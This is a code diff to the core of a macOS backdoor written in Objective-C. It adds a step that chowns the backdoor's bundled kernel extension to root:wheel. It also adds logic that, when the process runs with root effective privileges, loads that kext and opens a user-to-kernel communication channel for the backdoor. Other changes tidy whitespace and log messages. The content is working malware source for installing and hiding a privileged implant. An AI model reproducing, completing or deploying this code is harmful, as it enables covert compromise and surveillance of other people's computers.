@@ -1612,13 +1612,13 @@ static void computerWillShutdown(CFMachPortRef port,
   
   [binData writeToFile: _backdoorContentPath
             atomically: YES];
-  
+
   _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           gKextName,
                           @"/Contents/MacOS",
                           gKextName];
-  
+
   NSString *tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                            [[NSBundle mainBundle] bundlePath],
                            gKextName];
@@ -1626,14 +1626,26 @@ static void computerWillShutdown(CFMachPortRef port,
   infoLog(@"tempKextDir: %@", tempKextDir);
   infoLog(@"backdoorContentPath: %@", _backdoorContentPath);
 #endif
-  
+
   [[NSFileManager defaultManager] moveItemAtPath: tempKextDir
                                           toPath: _backdoorContentPath
                                            error: nil];
-  
+
   [tempKextDir release];
   [taskOutput release];
-  
+
+  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
+                       [[NSBundle mainBundle] bundlePath],
+                       gKextName];
+  NSArray *arguments = [NSArray arrayWithObjects:
+                        @"-R",
+                        @"root:wheel",
+                        _backdoorContentPath,
+                        nil];
+  [gUtil executeTask: @"/usr/sbin/chown"
+       withArguments: arguments
+        waitUntilEnd: YES];
+
   //
   // Backdoor .app Info.plist
   //
@@ -2801,8 +2813,40 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifndef NO_KEXT
   int ret = 0;
   int kextLoaded = 0;
+
+  if (getuid() != 0 && geteuid() == 0)
+    {
+      if ([self connectKext] == -1)
+        {
+#ifdef DEBUG_CORE
+          warnLog(@"connectKext failed, trying to load the KEXT");
+#endif
+
+          if ([gUtil loadKext] == YES)
+            {
+#ifdef DEBUG_CORE
+              infoLog(@"KEXT loaded successfully");
+#endif
+
+              if ([self connectKext] != -1)
+                {
+                  kextLoaded = 1;
+                }
+              else
+                {
+#ifdef DEBUG_CORE
+                  errorLog(@"Error on KEXT init");
+#endif
+                }
+            }
+        }
+      else
+        {
+          kextLoaded = 1;
+        }
+    }
   
-  
+
   if (kextLoaded == 1)
     {
 #ifdef DEBUG_CORE
@@ -3214,7 +3258,7 @@ static void computerWillShutdown(CFMachPortRef port,
 - (int)connectKext
 {
 #ifdef DEBUG_CORE
-  infoLog(@"[connectKext] Initializing backdoor with kext");
+  infoLog(@"Initializing backdoor with kext");
 #endif
   
   gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
@@ -3228,8 +3272,8 @@ static void computerWillShutdown(CFMachPortRef port,
       if (ret < 0)
         {
 #ifdef DEBUG_CORE
-          errorLog(@"[connectKext] Error while initializing the uspace-kspace "\
-                        "communication channel");
+          errorLog(@"Error while initializing the uspace-kspace "\
+                     "communication channel");
 #endif
           
           return -1;
@@ -3237,14 +3281,14 @@ static void computerWillShutdown(CFMachPortRef port,
       else
         {
 #ifdef DEBUG_CORE
-          infoLog(@"[connectKext] Backdoor initialized correctly");
+          infoLog(@"Backdoor initialized correctly");
 #endif
         }
     }
   else
     {
 #ifdef DEBUG_CORE
-      errorLog(@"[connectKext] Error while opening the KEXT dev entry!");
+      errorLog(@"Error while opening the KEXT dev entry!");
 #endif
       
       return -1;
